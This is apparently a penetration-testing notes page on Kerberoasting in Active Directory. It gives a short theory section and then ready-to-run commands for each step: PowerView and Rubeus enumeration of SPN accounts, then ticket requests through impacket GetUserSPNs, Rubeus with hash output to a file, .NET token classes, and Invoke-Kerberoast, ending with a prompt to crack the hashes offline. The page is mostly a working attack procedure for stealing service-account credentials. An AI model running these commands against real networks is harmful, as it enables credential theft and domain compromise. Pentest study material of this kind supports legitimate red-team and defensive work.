# Kerberoasting

## Theory

The Ticket-Grating Service(TGS) has a server portion which is encrypted with the password hash of service account. This makes possible to request the ticket and save it offline to bruteforce it.&#x20;

This is also possible because (non-machine) service account passwords are not frequently changed.

<figure><img src="../../../.gitbook/assets/Pasted image 20240415190001.png" alt=""><figcaption></figcaption></figure>

## Abuse

### Enumeration

Can be done with Powerview

```powershell
Get-DomainUser -SPN
```

or with Rubeus

```powershell
./Rubeus.exe kerberoast /stats /rc4opsec
```

### Exploitation

A ticket neeed to be requested and saved offline

{% tabs %}
{% tab title="Linux" %}
```bash
impacket-GetUserSPNs <$Name Machine>/<$User>:<$Pass> -request
```
{% endtab %}

{% tab title="Windows" %}
#### Using Rubeus

{% code overflow="wrap" %}
```powershell
./Rubeus.exe kerberoast /user:<$User> /simple /rc4opsec /outfile:hash.txt
```
{% endcode %}

#### Using .Net classes

{% code overflow="wrap" %}
```powershell
Add-Type -AssemblyNAme System.IdentityModel New-Object System.IdentityModel.Tokens.KerberosRequestorSecurity Token -ArgumentList "<$Domain>/<$Account>"
```
{% endcode %}

#### Using Invoke-Kerberoast

from BC Empire (https://github.com/BC-SECURITY/Empire)

{% code overflow="wrap" %}
```powershell
. .\Invoke-Kerberoast.ps1 
Invoke-Kerberoast -Identity <$Account>
```
{% endcode %}
{% endtab %}
{% endtabs %}

and then crack it
